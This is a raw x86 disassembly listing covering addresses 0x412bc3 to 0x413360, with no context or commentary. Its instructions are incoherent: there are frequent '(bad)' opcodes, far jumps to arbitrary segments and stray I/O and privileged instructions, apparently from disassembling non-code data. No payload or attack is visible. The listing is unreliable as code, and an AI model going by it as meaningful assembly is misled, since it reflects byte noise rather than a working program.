  412bc3:	sub    DWORD PTR [ebx+0x26],ecx
  412bc6:	call   0x86dd:0x9be9327f
  412bcd:	xchg   ebx,eax
  412bce:	jecxz  0x412c06
  412bd0:	pop    esi
  412bd1:	pop    esp
  412bd2:	xor    BYTE PTR [ebp-0x4c],0x15
  412bd6:	aad    0x75
  412bd8:	outs   dx,DWORD PTR ds:[esi]
  412bd9:	xor    DWORD PTR [edx-0x5],edx
  412bdc:	sub    al,0x73
  412bde:	test   eax,0xeb3ccfa8
  412be3:	adc    bh,BYTE PTR [ebx+ebp*2+0x3fd08dd2]
  412bea:	sub    DWORD PTR [edi+0x2c9da086],eax
  412bf0:	adc    ecx,DWORD PTR [ebp-0x1]
  412bf3:	popf   
  412bf4:	jmp    0xaaeb:0x263919a5
  412bfb:	aam    0xdd
  412bfd:	push   0xd15f1e6
  412c02:	sar    DWORD PTR [edi-0x37],cl
  412c05:	scas   eax,DWORD PTR es:[edi]
  412c06:	cmp    ecx,DWORD PTR [eax-0x4c]
  412c09:	fadd   QWORD PTR [edi-0x16]
  412c0c:	jne    0x412c8c
  412c0e:	jno    0x412c43
  412c10:	push   edx
  412c11:	xchg   ebx,eax
  412c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c13:	dec    esp
  412c14:	fsub   QWORD PTR [esi]
  412c16:	adc    ch,cl
  412c18:	sub    al,0xb7
  412c1a:	aaa    
  412c1b:	xchg   ecx,eax
  412c1c:	mov    bh,BYTE PTR [ebp-0x612721fa]
  412c22:	nop
  412c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c24:	loopne 0x412bed
  412c26:	pop    ebp
  412c27:	shl    DWORD PTR [edi],cl
  412c29:	xchg   esp,eax
  412c2a:	mov    esi,0x7422aa3a
  412c2f:	ret    
  412c30:	push   es
  412c31:	add    bh,cl
  412c33:	fwait
  412c34:	js     0x412c8b
  412c36:	mov    dl,0xa9
  412c38:	stos   DWORD PTR es:[edi],eax
  412c39:	imul   esi,DWORD PTR [ebx-0x6f],0xffffffdb
  412c3d:	sbb    al,0xb8
  412c3f:	mov    esp,0xe588c7e7
  412c44:	jns    0x412bf2
  412c46:	shr    BYTE PTR ds:0x5ec4539c,cl
  412c4c:	test   al,0x97
  412c4e:	jmp    0x693b:0x42cf0877
  412c55:	lds    ebx,FWORD PTR [eax+0x51]
  412c58:	or     DWORD PTR [esp+ebx*8],ecx
  412c5b:	ins    DWORD PTR es:[edi],dx
  412c5c:	adc    DWORD PTR [ecx+eax*4],esp
  412c5f:	sar    BYTE PTR [edi],0x6a
  412c62:	mov    edi,0xd1819cac
  412c67:	jbe    0x412c2e
  412c69:	inc    esp
  412c6a:	add    ebx,DWORD PTR [ecx+0x3d262dcc]
  412c70:	mov    ebx,0x1c80fd94
  412c75:	jne    0x412c48
  412c77:	cwde   
  412c78:	and    edx,edi
  412c7a:	and    al,0x5c
  412c7c:	loopne 0x412ce4
  412c7e:	stc    
  412c7f:	pop    ebp
  412c80:	mov    edx,0x17684fc8
  412c85:	sub    ch,bh
  412c87:	retf   
  412c88:	fmul   DWORD PTR [edx]
  412c8a:	jmp    0x412cab
  412c8c:	shr    cl,cl
  412c8e:	add    DWORD PTR [edx],eax
  412c90:	daa    
  412c91:	aaa    
  412c92:	arpl   WORD PTR [eax-0x70],bx
  412c95:	push   ss
  412c96:	add    al,0x45
  412c98:	ss pop ds
  412c9a:	pop    ecx
  412c9b:	push   edx
  412c9c:	gs sub eax,0x1f1ce7a4
  412ca2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ca3:	mov    edx,0x6fe805d6
  412ca8:	inc    eax
  412ca9:	ds jmp 0x60c0050c
  412caf:	ret    0x19ed
  412cb2:	jecxz  0x412cee
  412cb4:	cmp    ebp,DWORD PTR [ecx]
  412cb6:	dec    ebx
  412cb7:	lods   al,BYTE PTR ds:[esi]
  412cb8:	add    bh,BYTE PTR [ecx-0x21]
  412cbb:	and    bh,bh
  412cbd:	adc    BYTE PTR [ecx],ah
  412cbf:	cmp    al,0xdf
  412cc1:	sub    al,0x41
  412cc3:	lds    edx,FWORD PTR [ebp-0x4bcda337]
  412cc9:	push   edi
  412cca:	not    DWORD PTR [edx]
  412ccc:	push   ebx
  412ccd:	dec    esi
  412cce:	xchg   ecx,eax
  412ccf:	xchg   ecx,eax
  412cd0:	ret    0x4427
  412cd3:	pop    edi
  412cd4:	loopne 0x412ce3
  412cd6:	(bad)  
  412cd7:	mov    al,ds:0x2b34cfb9
  412cdc:	cmp    DWORD PTR [eax+0x47ecd496],esp
  412ce2:	frstor [esi+ecx*4+0x55535999]
  412ce9:	pop    ds
  412cea:	mov    eax,ds:0xad199916
  412cef:	push   esi
  412cf0:	hlt    
  412cf1:	popa   
  412cf2:	(bad)  
  412cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cf5:	jb     0x412d28
  412cf7:	or     eax,DWORD PTR [esi]
  412cf9:	or     al,0x29
  412cfb:	(bad)  
  412cfd:	push   es
  412cfe:	out    dx,al
  412cff:	jmp    0x8857:0x3ab6d0e0
  412d06:	sub    DWORD PTR [ecx],0xffffffaf
  412d09:	push   es
  412d0a:	adc    al,0x7b
  412d0c:	jmp    0x28f81399
  412d11:	add    al,0xa6
  412d13:	test   BYTE PTR [ecx],ch
  412d15:	scas   al,BYTE PTR es:[edi]
  412d16:	pop    ebp
  412d17:	lds    ebx,FWORD PTR [edi+0x2e]
  412d1a:	dec    ecx
  412d1b:	arpl   bx,cx
  412d1d:	test   al,0x55
  412d1f:	fsubr  DWORD PTR [ebx]
  412d21:	mov    ecx,0x875ccff3
  412d26:	jnp    0x412d97
  412d28:	std    
  412d29:	push   0x3d
  412d2b:	(bad)  
  412d2c:	xchg   edx,eax
  412d2d:	cmc    
  412d2e:	(bad)  
  412d2f:	fisubr DWORD PTR [edi+0x4a]
  412d32:	out    dx,eax
  412d33:	mov    BYTE PTR [edx],dl
  412d35:	inc    ebp
  412d36:	cmp    eax,0x819ca172
  412d3b:	cmp    DWORD PTR [ecx],edi
  412d3d:	mov    dl,0x9e
  412d3f:	pusha  
  412d40:	rcr    ebx,cl
  412d42:	lods   al,BYTE PTR ds:[esi]
  412d43:	fild   DWORD PTR [edi+edx*2]
  412d46:	cmp    BYTE PTR ds:0xe423588b,bh
  412d4c:	fistp  QWORD PTR [ebx]
  412d4e:	jns    0x412d0d
  412d50:	sub    DWORD PTR [ebp+esi*2+0x6e4fb19d],esp
  412d57:	cmp    DWORD PTR [edi],esi
  412d59:	jecxz  0x412cdc
  412d5b:	ins    DWORD PTR es:[edi],dx
  412d5c:	lds    ebx,FWORD PTR [ebx+0x45]
  412d5f:	inc    ebx
  412d60:	xchg   ebp,eax
  412d61:	addr16 popf 
  412d63:	ret    
  412d64:	(bad)  
  412d65:	fnstcw WORD PTR [edx-0x6a]
  412d68:	pop    ebx
  412d69:	pop    esi
  412d6a:	mov    ebp,0x98863bdd
  412d6f:	jge    0x412d01
  412d71:	mov    al,0xcb
  412d73:	iret   
  412d74:	test   ecx,esp
  412d76:	nop
  412d77:	loope  0x412d24
  412d79:	xchg   DWORD PTR [edx-0x1dc8c02e],ebx
  412d7f:	push   esi
  412d80:	cmp    ah,BYTE PTR [ebx+0x3fa88722]
  412d86:	inc    ebp
  412d87:	test   DWORD PTR [ecx+0x4],0x95098df3
  412d8e:	scas   al,BYTE PTR es:[edi]
  412d8f:	std    
  412d90:	mov    bl,0xf8
  412d92:	loope  0x412dfe
  412d94:	add    BYTE PTR [edi-0x78],0x50
  412d98:	ins    BYTE PTR es:[edi],dx
  412d99:	pusha  
  412d9a:	(bad)  
  412d9b:	clc    
  412d9c:	push   0x57299125
  412da1:	mov    dh,0x29
  412da3:	repz cmps DWORD PTR ds:[si],DWORD PTR es:[di]
  412da6:	dec    esi
  412da7:	and    DWORD PTR [edx-0x3ee709ad],ecx
  412dad:	and    BYTE PTR [edi+0x2e],0x89
  412db1:	retf   0xf166
  412db4:	mov    ds:0xb9f1d137,al
  412db9:	aad    0x22
  412dbb:	bound  edx,QWORD PTR [esi-0x642ab9ef]
  412dc1:	jecxz  0x412d77
  412dc3:	fprem1 
  412dc5:	sbb    al,ch
  412dc7:	xor    dh,bl
  412dc9:	push   esi
  412dca:	lds    eax,FWORD PTR [ebp+0x4]
  412dcd:	jno    0x412d9d
  412dcf:	mov    dh,0x32
  412dd1:	fldcw  WORD PTR [edi+esi*2]
  412dd4:	xchg   esi,eax
  412dd5:	jmp    0xfe15:0x6302df4d
  412ddc:	sbb    BYTE PTR [ebx],bl
  412dde:	inc    eax
  412ddf:	cmp    eax,DWORD PTR [ebp-0x77]
  412de2:	or     BYTE PTR [edx+0x1fa29623],0x8d
  412de9:	fcmovnb st,st(2)
  412deb:	dec    edi
  412dec:	out    dx,eax
  412ded:	jp     0x412d9b
  412def:	push   esi
  412df0:	sbb    al,0xa7
  412df2:	(bad)  
  412df3:	nop
  412df4:	(bad)  
  412df5:	fadd   QWORD PTR [ecx+0x2a]
  412df8:	mov    eax,ds:0xfa10c5ca
  412dfd:	and    dl,dl
  412dff:	loop   0x412dc0
  412e01:	pusha  
  412e02:	xchg   ecx,eax
  412e03:	push   0x2c706533
  412e08:	les    ecx,FWORD PTR [eax+0x45]
  412e0b:	jo     0x412db8
  412e0d:	lahf   
  412e0e:	push   ebx
  412e0f:	xchg   BYTE PTR [esi-0x3f30a2d2],al
  412e15:	imul   edx,DWORD PTR [edx+edx*1+0x5b304320],0xfad3db7
  412e20:	mov    dh,BYTE PTR [edi+0x7db3ffba]
  412e26:	in     al,dx
  412e27:	xor    al,0xe7
  412e29:	in     eax,dx
  412e2a:	cdq    
  412e2b:	(bad)  
  412e2c:	test   DWORD PTR [eax],edi
  412e2e:	shl    dh,cl
  412e30:	popf   
  412e31:	lds    edi,FWORD PTR [eax-0x2c3a2e12]
  412e37:	mov    esp,0xdf56a98e
  412e3c:	pop    edx
  412e3d:	jb     0x412e8b
  412e3f:	inc    edx
  412e40:	sub    BYTE PTR [ebx],ch
  412e42:	clc    
  412e43:	sbb    BYTE PTR [ecx+0xd8c2a9a],0xe7
  412e4a:	xchg   DWORD PTR [edx],ebx
  412e4c:	push   cs
  412e4d:	add    bl,BYTE PTR [esi-0x3d]
  412e50:	call   0x3868:0x71179bf9
  412e57:	and    dl,BYTE PTR [ecx-0x5b]
  412e5a:	jb     0x412e29
  412e5c:	or     edi,DWORD PTR [edi+eiz*8-0x6f]
  412e60:	mov    al,ds:0xed4bc0f4
  412e65:	inc    esi
  412e66:	mov    dh,ah
  412e68:	inc    ebx
  412e69:	sub    al,0x69
  412e6b:	shl    BYTE PTR [ecx-0x1e],cl
  412e6e:	pop    ss
  412e6f:	cmp    al,0xa5
  412e71:	xor    edx,eax
  412e73:	mov    ch,0xec
  412e75:	iret   
  412e76:	hlt    
  412e77:	xchg   esp,eax
  412e78:	and    DWORD PTR [esi+0x5247d829],ecx
  412e7e:	aas    
  412e7f:	imul   edx,DWORD PTR [edx],0x4191980e
  412e85:	jl     0x412ef4
  412e87:	pop    esp
  412e88:	es (bad) 
  412e8b:	retf   
  412e8c:	je     0x412eca
  412e8e:	loop   0x412eca
  412e90:	push   edx
  412e91:	mov    al,ds:0x558d7740
  412e96:	fst    DWORD PTR ds:0x3c22ee36
  412e9c:	iret   
  412e9d:	push   es
  412e9e:	test   cl,dh
  412ea0:	lods   al,BYTE PTR ds:[esi]
  412ea1:	sbb    ebx,edx
  412ea3:	sbb    al,0x49
  412ea5:	mov    esi,0x8815f80d
  412eaa:	(bad)  
  412eab:	jne    0x412ed4
  412ead:	rol    DWORD PTR [ebp+0x2a],cl
  412eb0:	test   eax,0x46102ad3
  412eb5:	xchg   edi,eax
  412eb6:	js     0x412ea6
  412eb8:	retf   
  412eb9:	pop    edx
  412eba:	inc    esp
  412ebb:	inc    ebx
  412ebc:	cmp    esp,ebx
  412ebe:	xchg   edi,eax
  412ebf:	jle    0x412e92
  412ec1:	pop    es
  412ec2:	cmp    eax,0xee36835c
  412ec7:	stos   DWORD PTR es:[edi],eax
  412ec8:	dec    edi
  412ec9:	or     eax,0xefd449e2
  412ece:	in     al,dx
  412ecf:	test   al,0x56
  412ed1:	es jle 0x412eba
  412ed4:	push   ecx
  412ed5:	mov    edx,0xc8951151
  412eda:	jbe    0x412e8a
  412edc:	das    
  412edd:	test   eax,0xf291be32
  412ee2:	and    al,bh
  412ee4:	adc    BYTE PTR [esi-0x33],ah
  412ee7:	jbe    0x412f36
  412ee9:	adc    DWORD PTR [ebx-0x4aa8db8e],0x71cc9d26
  412ef3:	dec    edx
  412ef4:	xchg   BYTE PTR [ecx],bl
  412ef6:	jmp    0xc0371c69
  412efb:	inc    cx
  412efd:	pop    es
  412efe:	ret    0x402d
  412f01:	add    ah,ch
  412f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f04:	dec    edx
  412f05:	daa    
  412f06:	cdq    
  412f07:	fcmovb st,st(4)
  412f09:	out    0xae,al
  412f0b:	(bad)  
  412f0c:	ss scas eax,DWORD PTR es:[edi]
  412f0e:	dec    ebp
  412f0f:	mov    ds:0x48bfe11b,al
  412f14:	lahf   
  412f15:	and    DWORD PTR [ebx-0x97709a9],ebx
  412f1b:	mov    ebp,0x341b9dd1
  412f20:	add    BYTE PTR [edi-0x3e],ah
  412f23:	cmp    al,0x36
  412f25:	mov    cs,eax
  412f27:	pop    ecx
  412f28:	jbe    0x412f28
  412f2a:	mov    al,0x9
  412f2c:	cmp    dl,dh
  412f2e:	mov    gs,WORD PTR [edi-0x4c]
  412f31:	aas    
  412f32:	push   edx
  412f33:	(bad)  
  412f35:	ror    ebp,0x9b
  412f38:	ss icebp 
  412f3a:	adc    ecx,DWORD PTR [esi+edi*1]
  412f3d:	dec    ebp
  412f3e:	cwde   
  412f3f:	lahf   
  412f40:	jo     0x412f83
  412f42:	and    al,0x3b
  412f44:	daa    
  412f45:	mov    ds:0xd7281660,al
  412f4a:	rcl    esp,0x3f
  412f4d:	fistp  QWORD PTR [ebx+0x79]
  412f50:	lods   eax,DWORD PTR ds:[esi]
  412f51:	mov    eax,ds:0x91a4cc6b
  412f56:	scas   eax,DWORD PTR es:[edi]
  412f57:	outs   dx,BYTE PTR ds:[esi]
  412f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f59:	dec    ecx
  412f5a:	clc    
  412f5b:	cdq    
  412f5c:	xor    BYTE PTR [ecx-0x77],0x1
  412f60:	shl    BYTE PTR [ecx-0x1d150134],0x63
  412f67:	and    BYTE PTR [edi+0xb],0x4a
  412f6b:	mov    DWORD PTR [ebx-0x69],eax
  412f6e:	lods   al,BYTE PTR ds:[esi]
  412f6f:	(bad)  
  412f70:	into   
  412f71:	and    DWORD PTR [esi+0x537f1d2c],esp
  412f77:	jnp    0x412f8d
  412f79:	repz jae 0x412f5b
  412f7c:	aam    0x78
  412f7e:	pop    es
  412f7f:	mov    ds:0xeab62b41,al
  412f84:	lods   al,BYTE PTR ds:[esi]
  412f85:	mov    esi,0xcad0d084
  412f8a:	jmp    0x513d3881
  412f8f:	push   cs
  412f90:	xchg   esi,eax
  412f91:	jle    0x412f9a
  412f93:	addr16 das 
  412f95:	mov    ebx,0xab12eb3e
  412f9a:	or     eax,0xca402cc
  412f9f:	inc    edx
  412fa0:	gs push esp
  412fa2:	pop    esp
  412fa3:	sbb    dl,bh
  412fa5:	and    al,0xa0
  412fa7:	cmc    
  412fa8:	mov    ebp,0xd3da8159
  412fad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fae:	add    eax,0xe09292c9
  412fb3:	je     0x412fdc
  412fb5:	cmp    eax,0x63402c19
  412fba:	jge    0x412fd3
  412fbc:	pop    esp
  412fbd:	jmp    0x412fab
  412fbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fc0:	repz or DWORD PTR [ecx],ebp
  412fc3:	jbe    0x412f87
  412fc5:	push   es
  412fc6:	retf   
  412fc7:	and    eax,0x44e7212b
  412fcc:	jmp    0x9643:0x554dd269
  412fd3:	sub    al,0xa0
  412fd5:	test   eax,0x79799064
  412fda:	push   ecx
  412fdb:	imul   edx,DWORD PTR [ebp-0x80],0x44
  412fdf:	dec    esp
  412fe0:	ud1    edi,esi
  412fe3:	or     BYTE PTR [eax+ebp*4+0x1c],bh
  412fe7:	stc    
  412fe8:	imul   DWORD PTR [ebp+0x49a547a]
  412fee:	daa    
  412fef:	mov    ebx,0xeaa5fe39
  412ff4:	outs   dx,DWORD PTR ds:[esi]
  412ff5:	adc    eax,0x21b72d1a
  412ffa:	(bad)  
  412ffb:	jno    0x412fcb
  412ffd:	jo     0x413016
  412fff:	adc    edi,DWORD PTR [edi+esi*4]
  413002:	(bad)  
  413003:	fistp  WORD PTR [ebx+edi*4-0xffd6ac4]
  41300a:	or     ebx,ebp
  41300c:	xor    al,0xee
  41300e:	cli    
  41300f:	inc    ecx
  413010:	outs   dx,DWORD PTR ds:[esi]
  413011:	(bad)  
  413012:	out    dx,al
  413013:	sub    BYTE PTR [edi-0x520ef419],0x7b
  41301a:	xchg   ecx,eax
  41301b:	and    esp,ebp
  41301d:	mov    ds:0x993ac020,eax
  413022:	mov    ebp,eax
  413024:	test   bh,bl
  413026:	call   0xf9e68d85
  41302b:	rcl    DWORD PTR [eax-0x25],1
  41302e:	push   esp
  41302f:	pop    es
  413030:	imul   ebx,DWORD PTR [edx-0x3b],0xffffff86
  413034:	cmp    eax,0xdcb4ea82
  413039:	retf   0xfb4c
  41303c:	cdq    
  41303d:	sti    
  41303e:	or     eax,ecx
  413040:	je     0x413038
  413042:	mov    ch,0xa
  413044:	nop
  413045:	sbb    DWORD PTR [ecx],edx
  413047:	or     esi,DWORD PTR [esi]
  413049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41304a:	imul   DWORD PTR [ecx+esi*8]
  41304d:	sahf   
  41304e:	inc    esp
  41304f:	inc    ebp
  413050:	sbb    DWORD PTR [edx+esi*4-0x3cdc0f8a],ebp
  413057:	idiv   DWORD PTR [esi+ebx*2-0x57]
  41305b:	xor    al,0x2e
  41305d:	sbb    ah,cl
  41305f:	mov    DWORD PTR [eax-0x25200783],eax
  413065:	(bad)  
  413066:	std    
  413067:	sbb    edi,DWORD PTR [ebx+eax*1+0x4c90e86a]
  41306e:	cmc    
  41306f:	out    0xd,eax
  413071:	mov    ebp,0xd00c1eb0
  413076:	or     ah,bh
  413078:	test   BYTE PTR [edx+0xcb34bac],bh
  41307e:	or     al,0x2
  413080:	test   DWORD PTR [ebp+0x4585d006],esi
  413086:	xchg   edi,eax
  413087:	test   BYTE PTR [ebp-0x4f],bh
  41308a:	mov    ds:0xc3fe9d2,eax
  41308f:	and    ebx,DWORD PTR [ebx+0x32efb352]
  413095:	inc    edx
  413096:	lahf   
  413097:	test   eax,0x63e31742
  41309c:	or     ebp,DWORD PTR [ecx]
  41309e:	aaa    
  41309f:	stos   BYTE PTR es:[edi],al
  4130a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130a1:	or     eax,0x3523cff3
  4130a6:	mov    eax,0x4beb2620
  4130ab:	mov    cl,0xa8
  4130ad:	push   edx
  4130ae:	aas    
  4130af:	push   ebp
  4130b0:	out    dx,eax
  4130b1:	add    al,0x44
  4130b3:	inc    ecx
  4130b4:	xchg   DWORD PTR [esi+0x498c286d],eax
  4130ba:	imul   esi,edi,0xffffff9f
  4130bd:	cld    
  4130be:	(bad)  
  4130bf:	test   bl,bh
  4130c1:	mov    dh,0x9b
  4130c3:	jp     0x413050
  4130c5:	or     eax,0xfdaed162
  4130ca:	ins    BYTE PTR es:[edi],dx
  4130cb:	add    ebp,DWORD PTR [edi+0x6c]
  4130ce:	scas   al,BYTE PTR es:[edi]
  4130cf:	mov    esp,0x164f1fbe
  4130d4:	and    al,0x1f
  4130d6:	mov    ch,dh
  4130d8:	push   eax
  4130d9:	in     eax,0x10
  4130db:	pusha  
  4130dc:	cwde   
  4130dd:	cmp    al,0xb6
  4130df:	jno    0x4130f9
  4130e1:	push   edi
  4130e2:	dec    ebx
  4130e3:	xchg   edi,eax
  4130e4:	mov    dh,0xd6
  4130e6:	nop
  4130e7:	jns    0x41306e
  4130e9:	pop    ebp
  4130ea:	inc    edi
  4130eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130ec:	sbb    edx,DWORD PTR [edx+edx*8+0x26]
  4130f0:	in     eax,dx
  4130f1:	dec    ebx
  4130f2:	pop    es
  4130f3:	add    BYTE PTR [eax+0x69],bh
  4130f6:	cmp    DWORD PTR [ebx-0x42],ebp
  4130f9:	in     al,0x6c
  4130fb:	call   0x9096:0xd8d97788
  413102:	cmp    dl,al
  413104:	inc    ebp
  413105:	test   DWORD PTR [ebx+0x79],edx
  413108:	jl     0x41315a
  41310a:	mov    ss,WORD PTR [eax+esi*8]
  41310d:	jnp    0x413179
  41310f:	(bad)  
  413110:	sbb    eax,0x96c4f3da
  413115:	or     ch,BYTE PTR [esi+0x1c]
  413118:	ror    esi,cl
  41311a:	xchg   DWORD PTR [edx+0x534bce23],ebp
  413120:	xchg   edi,eax
  413121:	cld    
  413122:	imul   ecx,eax,0x34
  413125:	stos   BYTE PTR es:[edi],al
  413126:	lds    ecx,FWORD PTR [edx+ecx*2]
  413129:	into   
  41312a:	shl    DWORD PTR ds:0x773c976c,1
  413130:	loope  0x41311d
  413132:	repz xor bl,BYTE PTR [ebp+0x79]
  413136:	xor    dh,BYTE PTR [esi+0x6925ff97]
  41313c:	mov    esi,0xfadb3e62
  413141:	mov    DWORD PTR [eax],ebx
  413143:	add    eax,0x46381911
  413148:	xchg   edi,eax
  413149:	inc    ebx
  41314a:	cmp    DWORD PTR [edx+eax*4-0x592d66d7],ecx
  413151:	lods   eax,DWORD PTR ds:[esi]
  413152:	iret   
  413153:	outs   dx,DWORD PTR ds:[esi]
  413154:	loopne 0x413156
  413156:	mov    WORD PTR [esi],cs
  413158:	dec    edi
  413159:	sub    esp,DWORD PTR [eax+0x6cc6a601]
  41315f:	cs or  bl,ch
  413162:	loopne 0x4131b1
  413164:	in     al,dx
  413165:	inc    edx
  413166:	jns    0x413117
  413168:	shr    DWORD PTR [ecx-0x59441170],1
  41316e:	fiadd  DWORD PTR [ebx]
  413170:	shr    DWORD PTR [esi+edx*4],1
  413173:	call   0x467646a
  413178:	loop   0x41319d
  41317a:	jmp    0x9524ab6a
  41317f:	sbb    ebp,DWORD PTR [ecx+0x4b569d3e]
  413185:	cmp    ch,BYTE PTR [ecx+0x282ef3c5]
  41318b:	lods   eax,DWORD PTR ds:[esi]
  41318c:	hlt    
  41318d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41318e:	pop    edi
  41318f:	hlt    
  413190:	not    BYTE PTR [ecx+0x3a97189f]
  413196:	sar    DWORD PTR [eax-0x17],1
  413199:	sbb    esi,esp
  41319b:	std    
  41319c:	fist   WORD PTR [ecx-0x11]
  41319f:	inc    eax
  4131a0:	aam    0x2a
  4131a2:	fsubr  st(4),st
  4131a4:	and    al,0x4f
  4131a6:	fbld   TBYTE PTR [ebx+ebp*2-0xd69c08a]
  4131ad:	or     dl,ah
  4131af:	xchg   ebx,eax
  4131b0:	cmp    al,0x0
  4131b2:	cmp    DWORD PTR [edi+0x48],0x16
  4131b6:	icebp  
  4131b7:	jl     0x4131b2
  4131b9:	lock rol DWORD PTR [edi-0x28da7a65],cl
  4131c0:	fild   QWORD PTR ds:0x89217b74
  4131c7:	jae    0x4131b8
  4131c9:	mov    dh,0xf
  4131cb:	out    0xfd,eax
  4131cd:	and    eax,ecx
  4131cf:	inc    esp
  4131d0:	rcr    BYTE PTR [edi],0xad
  4131d3:	mov    ah,0xeb
  4131d5:	lods   al,BYTE PTR ds:[esi]
  4131d6:	sbb    DWORD PTR [edi-0x3e],esi
  4131d9:	add    BYTE PTR [edx+0x72],dh
  4131dc:	setp   BYTE PTR [edx]
  4131df:	inc    ebp
  4131e0:	dec    esi
  4131e1:	or     DWORD PTR [esi-0xd],esi
  4131e4:	mov    dh,0x51
  4131e6:	call   0x9dfa:0xe61bcc04
  4131ed:	aam    0x2f
  4131ef:	xor    al,0xde
  4131f1:	fnstcw WORD PTR [eax+0x23af315c]
  4131f7:	shl    BYTE PTR [ebp+0x3af39131],1
  4131fd:	dec    eax
  4131fe:	pop    eax
  4131ff:	ds xchg ebx,eax
  413201:	pop    ecx
  413202:	fstp   TBYTE PTR ds:0xe3c172ce
  413208:	mov    edx,DWORD PTR [ebp+0x5723ea57]
  41320e:	cs jno 0x413278
  413211:	cmp    BYTE PTR [edx+edx*2-0x57],ah
  413215:	stos   BYTE PTR es:[edi],al
  413216:	xor    esi,eax
  413218:	aaa    
  413219:	stos   DWORD PTR es:[edi],eax
  41321a:	popa   
  41321b:	sub    edi,esi
  41321d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41321e:	rcl    esp,0x9a
  413221:	rol    BYTE PTR [eax+0x76],1
  413224:	inc    ebp
  413225:	jp     0x41328f
  413227:	js     0x4131dd
  413229:	mov    bh,0xae
  41322b:	aad    0x83
  41322d:	popf   
  41322e:	enter  0xeb9a,0xe9
  413232:	loope  0x41324f
  413234:	adc    bh,ch
  413236:	push   es
  413237:	add    BYTE PTR [ecx-0x3f1d1d38],ah
  41323d:	fst    QWORD PTR [eax-0x47]
  413240:	push   0xffffffef
  413242:	shl    DWORD PTR [ecx+0x33],0xe1
  413246:	cld    
  413247:	cmp    BYTE PTR [esi-0x18],ah
  41324a:	fimul  WORD PTR [edx+0x63]
  41324d:	in     al,dx
  41324e:	cld    
  41324f:	inc    edi
  413250:	shr    BYTE PTR [edi+0x78],0x2f
  413254:	lea    edi,[edx]
  413256:	adc    edx,DWORD PTR [edx+ecx*8-0x63]
  41325a:	cmp    cl,BYTE PTR [ebx]
  41325c:	call   0x5170:0x7e653851
  413263:	add    BYTE PTR [ecx],al
  413265:	and    al,0xfd
  413267:	push   edi
  413268:	idiv   DWORD PTR [ebx-0x17]
  41326b:	sahf   
  41326c:	scas   eax,DWORD PTR es:[edi]
  41326d:	pop    esp
  41326e:	and    ch,0x73
  413271:	addr16 cmp edx,DWORD PTR [bx]
  413275:	xchg   ebp,eax
  413276:	mov    DWORD PTR [ecx+0x4a37428a],0x6d514089
  413280:	xor    al,0xb5
  413282:	dec    esi
  413283:	and    al,0x1a
  413285:	lds    ebx,FWORD PTR [edx-0xe2cfe2b]
  41328b:	inc    ebx
  41328c:	aad    0xcc
  41328e:	ds pop ss
  413290:	jno    0x413237
  413292:	fadd   DWORD PTR [edi-0x2]
  413295:	xlat   BYTE PTR ds:[ebx]
  413296:	outs   dx,BYTE PTR ds:[esi]
  413297:	sub    al,0x9a
  413299:	mov    ebp,0x15f56e17
  41329e:	mov    ecx,0x4f31bc7d
  4132a3:	mov    esp,0x2582ef9c
  4132a8:	push   edx
  4132a9:	aas    
  4132aa:	cmp    dh,cl
  4132ac:	sub    al,0x69
  4132ae:	dec    esi
  4132af:	add    cl,BYTE PTR [edi]
  4132b1:	sbb    eax,0x96e4a37b
  4132b6:	ins    BYTE PTR es:[edi],dx
  4132b7:	leave  
  4132b8:	repnz adc ecx,esp
  4132bb:	dec    esi
  4132bc:	outs   dx,DWORD PTR ds:[esi]
  4132bd:	mov    BYTE PTR [edi+0x65],bh
  4132c0:	int3   
  4132c1:	shr    DWORD PTR [edi],cl
  4132c3:	add    BYTE PTR [edi+0x26],0x16
  4132c7:	push   0x5bddf5b6
  4132cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132cd:	inc    ebx
  4132ce:	dec    edx
  4132cf:	int    0x74
  4132d1:	out    dx,al
  4132d2:	cmp    al,0x2c
  4132d4:	fdiv   QWORD PTR [edx]
  4132d6:	xor    BYTE PTR [ebx+0x4f],ah
  4132d9:	mov    esi,0x45bac82d
  4132de:	test   eax,0x7885d59a
  4132e3:	call   0x372b:0x1fb98d0
  4132ea:	dec    esp
  4132eb:	out    0x30,al
  4132ed:	data16 fiadd DWORD PTR [edi]
  4132f0:	out    dx,al
  4132f1:	(bad)  
  4132f2:	mov    edx,0x2155ab60
  4132f7:	sti    
  4132f8:	xor    ebx,DWORD PTR [ebx]
  4132fa:	jb     0x4132dd
  4132fc:	jb     0x4132be
  4132fe:	inc    ecx
  4132ff:	out    0x2b,al
  413301:	rol    DWORD PTR [ecx+0x16],0x73
  413305:	mov    al,0xca
  413307:	int3   
  413308:	js     0x413320
  41330a:	imul   ebp,DWORD PTR [edi-0x5646c8b1],0x2f
  413311:	or     BYTE PTR [ebp+0x2189da52],dh
  413317:	les    eax,FWORD PTR [edx]
  413319:	sbb    BYTE PTR [edx+eiz*4+0x3663ce43],0x47
  413321:	sbb    al,0xeb
  413323:	sbb    BYTE PTR [eax+eax*1-0x7d],0xa2
  413328:	mov    BYTE PTR [ebx+ebp*4-0xa],ch
  41332c:	inc    edi
  41332d:	pop    ds
  41332e:	movq   mm0,mm3
  413331:	test   cl,cl
  413333:	add    DWORD PTR [edx+0x5d416f88],ebx
  413339:	xchg   ecx,eax
  41333a:	or     eax,0x1d93d9bb
  41333f:	ins    BYTE PTR es:[edi],dx
  413340:	and    DWORD PTR [edi],ebx
  413342:	inc    ebp
  413343:	daa    
  413344:	fwait
  413345:	std    
  413346:	and    edx,esp
  413348:	je     0x4133c5
  41334a:	mov    ebx,0x55a1af98
  41334f:	dec    ecx
  413350:	pop    es
  413351:	push   ebx
  413352:	in     eax,0xe
  413354:	jne    0x413317
  413356:	mov    eax,ds:0x671e1675
  41335b:	mov    esp,0x12e84b81
  413360:	cli    
